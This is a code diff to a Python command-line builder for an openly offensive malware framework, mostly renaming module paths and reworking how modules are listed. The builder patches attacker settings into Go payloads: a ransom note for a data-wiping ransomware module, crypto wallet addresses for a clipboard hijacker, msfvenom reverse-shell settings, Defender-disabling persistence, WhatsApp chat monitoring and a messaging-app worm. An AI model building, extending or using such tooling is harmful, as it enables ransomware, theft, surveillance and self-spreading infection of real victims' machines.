@@ -8,14 +8,14 @@ import fileinput
 import base64
 
 MODULES = {
-    'daemon/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
-    'daemon/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
-    'daemon/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
-    'daemon/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
-    'daemon/silverhandghost': {'desc': 'Provides a reverse shell for remote access'},
-    'daemon/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
-    'daemon/overwatch': {'desc': 'Monitors all victims Whatsapp chats'},
-    'daemon/bartmossbrainworm': {'desc': 'A worm that spreads itself through messaging apps'},
+    'module/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
+    'module/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
+    'module/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
+    'module/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
+    'module/silverhandghost': {'desc': 'Provides a reverse shell for remote access'},
+    'module/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
+    'module/overwatch': {'desc': 'Monitors all victims Whatsapp chats'},
+    'module/bartmossbrainworm': {'desc': 'A worm that spreads itself through messaging apps'},
 }
 
 MODULE_CHAIN = []
@@ -26,33 +26,33 @@ BUILD_OPTIONS = {
 }
 
 MODULE_OPTIONS = {
-    'daemon/hellhound': {
+    'module/hellhound': {
         'PERSISTENCE': 'true',
         'DEFENDER_EXCLUDE': 'true',
     },
-    'daemon/gremlin': {
+    'module/gremlin': {
         'BTC_ADDRESS': '1BitcoinPredefinedAddressExample1234',
         'ETH_ADDRESS': '0xEthereumPredefinedAddress1234567890abcdef',
         'BEP20_ADDRESS': '0xBEP20PredefinedAddress1234567890abcdef',
         'SOL_ADDRESS': 'So1anaPredefinedAddressExample1234567890',
     },
-    'daemon/blackice': {
+    'module/blackice': {
         'DURATION': '60',
     },
-    'daemon/logicbomb': {
+    'module/logicbomb': {
         'BLOCK_INPUT': 'true',
         'TRIGGER_DELAY': '10',
     },
-    'daemon/silverhandghost': {
+    'module/silverhandghost': {
         'LHOST': '0.0.0.0',
         'LPORT': '4444',
         'KEY': 'changeme',
     },
-    'daemon/krash': {
+    'module/krash': {
         'NOTE': 'Your ransom note here',
     },
-    'daemon/overwatch': {},
-    'daemon/bartmossbrainworm': {
+    'module/overwatch': {},
+    'module/bartmossbrainworm': {
         'MESSAGE': 'Hello from BartmossBrainworm!'
     },
 }
@@ -108,7 +108,17 @@ def print_ui():
     print()
 
 def get_module_names():
-    return list(MODULES.keys())
+    names = list(MODULES.keys())
+    short_names = [n.split('/', 1)[-1] for n in names]
+    return names + short_names
+
+def resolve_module_name(name):
+    if name in MODULES:
+        return name
+    modname = f"module/{name}"
+    if modname in MODULES:
+        return modname
+    return None
 
 def shell_completer(text, state):
     buffer = readline.get_line_buffer()
@@ -125,10 +135,9 @@ def shell_completer(text, state):
 
 def print_modules():
     print("\nAvailable modules:")
-    print(f"{'Module':<25} | Description")
-    print("-"*60)
     for name, info in MODULES.items():
-        print(f"{name:<25} | {info.get('desc', '')}")
+        short_name = name.split('/', 1)[-1]
+        print(f"  {PINK}{short_name:<18}{RESET} {info.get('desc', '')}")
     print()
 
 def print_global_options():
@@ -166,7 +175,7 @@ def colorize_message(msg):
         return f"{YELLOW}{msg}{RESET}"
 
 def patch_krash_note(note):
-    go_path = os.path.join('DAEMONS', 'krash.go')
+    go_path = os.path.join('MODULE', 'krash.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     with open(go_path, 'w') as f:
@@ -178,12 +187,12 @@ def patch_krash_note(note):
     return lines
 
 def restore_krash_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'krash.go')
+    go_path = os.path.join('MODULE', 'krash.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_silverhandghost_base64(exe_path):
-    go_path = os.path.join('DAEMONS', 'silverhandghost.go')
+    go_path = os.path.join('MODULE', 'silverhandghost.go')
     with open(exe_path, 'rb') as f:
         b64 = base64.b64encode(f.read()).decode()
     with open(go_path, 'r') as f:
@@ -197,12 +206,12 @@ def patch_silverhandghost_base64(exe_path):
     return lines 
 
 def restore_silverhandghost_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'silverhandghost.go')
+    go_path = os.path.join('MODULE', 'silverhandghost.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_hellhound_options(persistence, defender_exclude):
-    go_path = os.path.join('DAEMONS', 'hellhound.go')
+    go_path = os.path.join('MODULE', 'hellhound.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     new_lines = []
@@ -232,12 +241,12 @@ def patch_hellhound_options(persistence, defender_exclude):
     return lines
 
 def restore_hellhound_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'hellhound.go')
+    go_path = os.path.join('MODULE', 'hellhound.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address):
-    go_path = os.path.join('DAEMONS', 'gremlin.go')
+    go_path = os.path.join('MODULE', 'gremlin.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     new_lines = []
@@ -257,12 +266,12 @@ def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address
     return lines
 
 def restore_gremlin_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'gremlin.go')
+    go_path = os.path.join('MODULE', 'gremlin.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_blackice_options(duration):
-    go_path = os.path.join('DAEMONS', 'blackice.go')
+    go_path = os.path.join('MODULE', 'blackice.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     new_lines = []
@@ -276,12 +285,12 @@ def patch_blackice_options(duration):
     return lines
 
 def restore_blackice_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'blackice.go')
+    go_path = os.path.join('MODULE', 'blackice.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_logicbomb_options(block_input, trigger_delay):
-    go_path = os.path.join('DAEMONS', 'logicbomb.go')
+    go_path = os.path.join('MODULE', 'logicbomb.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     new_lines = []
@@ -304,7 +313,7 @@ def patch_logicbomb_options(block_input, trigger_delay):
     return lines
 
 def restore_logicbomb_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'logicbomb.go')
+    go_path = os.path.join('MODULE', 'logicbomb.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
@@ -321,7 +330,7 @@ def restore_overwatch_go(original_lines):
     pass
 
 def patch_bartmossbrainworm_message(message):
-    go_path = os.path.join('DAEMONS', 'bartmossbrainworm.go')
+    go_path = os.path.join('MODULE', 'bartmossbrainworm.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     with open(go_path, 'w') as f:
@@ -338,7 +347,7 @@ def patch_bartmossbrainworm_message(message):
     return lines
 
 def restore_bartmossbrainworm_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'bartmossbrainworm.go')
+    go_path = os.path.join('MODULE', 'bartmossbrainworm.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
@@ -366,9 +375,9 @@ def shell():
                 if len(parts) < 2:
                     output_lines.append("Usage: use <module>")
                 else:
-                    modname = parts[1]
-                    if modname not in MODULES:
-                        output_lines.append(f"Unknown module: {modname}")
+                    modname = resolve_module_name(parts[1])
+                    if not modname:
+                        output_lines.append(f"Unknown module: {parts[1]}")
                     elif modname in MODULE_CHAIN:
                         output_lines.append(f"Module already selected: {modname}")
                     else:
@@ -386,7 +395,7 @@ def shell():
                         modname = MODULE_CHAIN[0]
                         output_lines.append(f"Building single module: {modname}")
                         
-                        go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
+                        go_path = modname.replace('module/', 'MODULE/') + '.go'
                         krash_original = None
                         silverhandghost_original = None
                         hellhound_original = None
@@ -396,11 +405,11 @@ def shell():
                         overwatch_original = None
                         bartmossbrainworm_original = None
                         
-                        if modname == 'daemon/krash':
-                            note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
+                        if modname == 'module/krash':
+                            note = MODULE_OPTIONS.get('module/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                             krash_original = patch_krash_note(note)
-                        elif modname == 'daemon/silverhandghost':
-                            opts = MODULE_OPTIONS.get('daemon/silverhandghost', {})
+                        elif modname == 'module/silverhandghost':
+                            opts = MODULE_OPTIONS.get('module/silverhandghost', {})
                             lhost = opts.get('LHOST', '0.0.0.0')
                             lport = opts.get('LPORT', '4444')
                             key = opts.get('KEY', 'changeme')
@@ -411,31 +420,31 @@ def shell():
                                 output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                 continue
                             silverhandghost_original = patch_silverhandghost_base64(payload_path)
-                        elif modname == 'daemon/hellhound':
-                            opts = MODULE_OPTIONS.get('daemon/hellhound', {})
+                        elif modname == 'module/hellhound':
+                            opts = MODULE_OPTIONS.get('module/hellhound', {})
                             persistence = opts.get('PERSISTENCE', 'true')
                             defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                             hellhound_original = patch_hellhound_options(persistence, defender_exclude)
-                        elif modname == 'daemon/gremlin':
-                            opts = MODULE_OPTIONS.get('daemon/gremlin', {})
+                        elif modname == 'module/gremlin':
+                            opts = MODULE_OPTIONS.get('module/gremlin', {})
                             btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                             eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                             bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                             sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                             gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
-                        elif modname == 'daemon/blackice':
-                            opts = MODULE_OPTIONS.get('daemon/blackice', {})
+                        elif modname == 'module/blackice':
+                            opts = MODULE_OPTIONS.get('module/blackice', {})
                             duration = opts.get('DURATION', '60')
                             blackice_original = patch_blackice_options(duration)
-                        elif modname == 'daemon/logicbomb':
-                            opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
+                        elif modname == 'module/logicbomb':
+                            opts = MODULE_OPTIONS.get('module/logicbomb', {})
                             block_input = opts.get('BLOCK_INPUT', 'true')
                             trigger_delay = opts.get('TRIGGER_DELAY', '10')
                             logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
-                        elif modname == 'daemon/overwatch':
+                        elif modname == 'module/overwatch':
                             overwatch_original = patch_overwatch_options()
-                        elif modname == 'daemon/bartmossbrainworm':
-                            message = MODULE_OPTIONS.get('daemon/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
+                        elif modname == 'module/bartmossbrainworm':
+                            message = MODULE_OPTIONS.get('module/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
                             bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                         
                         module_name = modname.split('/')[-1]
@@ -486,12 +495,12 @@ def shell():
                         overwatch_original = None
                         bartmossbrainworm_original = None
                         for modname in MODULE_CHAIN:
-                            go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
-                            if modname == 'daemon/krash':
-                                note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
+                            go_path = modname.replace('module/', 'MODULE/') + '.go'
+                            if modname == 'module/krash':
+                                note = MODULE_OPTIONS.get('module/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                                 krash_original = patch_krash_note(note)
-                            if modname == 'daemon/silverhandghost':
-                                opts = MODULE_OPTIONS.get('daemon/silverhandghost', {})
+                            if modname == 'module/silverhandghost':
+                                opts = MODULE_OPTIONS.get('module/silverhandghost', {})
                                 lhost = opts.get('LHOST', '0.0.0.0')
                                 lport = opts.get('LPORT', '4444')
                                 key = opts.get('KEY', 'changeme')
@@ -502,31 +511,31 @@ def shell():
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
                                 silverhandghost_original = patch_silverhandghost_base64(payload_path)
-                            if modname == 'daemon/hellhound':
-                                opts = MODULE_OPTIONS.get('daemon/hellhound', {})
+                            if modname == 'module/hellhound':
+                                opts = MODULE_OPTIONS.get('module/hellhound', {})
                                 persistence = opts.get('PERSISTENCE', 'true')
                                 defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                                 hellhound_original = patch_hellhound_options(persistence, defender_exclude)
-                            if modname == 'daemon/gremlin':
-                                opts = MODULE_OPTIONS.get('daemon/gremlin', {})
+                            if modname == 'module/gremlin':
+                                opts = MODULE_OPTIONS.get('module/gremlin', {})
                                 btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                                 eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                                 bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                                 sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                                 gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
-                            if modname == 'daemon/blackice':
-                                opts = MODULE_OPTIONS.get('daemon/blackice', {})
+                            if modname == 'module/blackice':
+                                opts = MODULE_OPTIONS.get('module/blackice', {})
                                 duration = opts.get('DURATION', '60')
                                 blackice_original = patch_blackice_options(duration)
-                            if modname == 'daemon/logicbomb':
-                                opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
+                            if modname == 'module/logicbomb':
+                                opts = MODULE_OPTIONS.get('module/logicbomb', {})
                                 block_input = opts.get('BLOCK_INPUT', 'true')
                                 trigger_delay = opts.get('TRIGGER_DELAY', '10')
                                 logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
-                            if modname == 'daemon/overwatch':
+                            if modname == 'module/overwatch':
                                 overwatch_original = patch_overwatch_options()
-                            if modname == 'daemon/bartmossbrainworm':
-                                message = MODULE_OPTIONS.get('daemon/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
+                            if modname == 'module/bartmossbrainworm':
+                                message = MODULE_OPTIONS.get('module/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
                                 bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                             go_paths.append(go_path)
                         final_name = BUILD_OPTIONS['EXE_NAME']
@@ -575,10 +584,10 @@ def shell():
                     subcmd = parts[1].lower()
                     if subcmd == 'modules':
                         output_lines.append("")
-                        output_lines.append(f"{'Module':<25} | Description")
-                        output_lines.append("-"*60)
                         for name, info in MODULES.items():
-                            output_lines.append(f"{name:<25} | {info.get('desc', '')}")
+                            short_name = name.split('/', 1)[-1]
+                            output_lines.append(f"  {PINK}{short_name:<18}{RESET} {info.get('desc', '')}")
+                        output_lines.append("")
                     elif subcmd == 'global' and len(parts) > 2 and parts[2].lower() == 'options':
                         from io import StringIO
                         buf = StringIO()
@@ -615,7 +624,7 @@ def shell():
                         if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
                             MODULE_OPTIONS[mod][opt] = val
                             output_lines.append(f"Set {opt} to {val} for {mod}")
-                            if mod == 'daemon/bartmossbrainworm' and opt == 'MESSAGE':
+                            if mod == 'module/bartmossbrainworm' and opt == 'MESSAGE':
                                 patch_bartmossbrainworm_message(val)
                         elif opt.upper() in BUILD_OPTIONS:
                             if opt.upper() == 'OBFUSCATE':
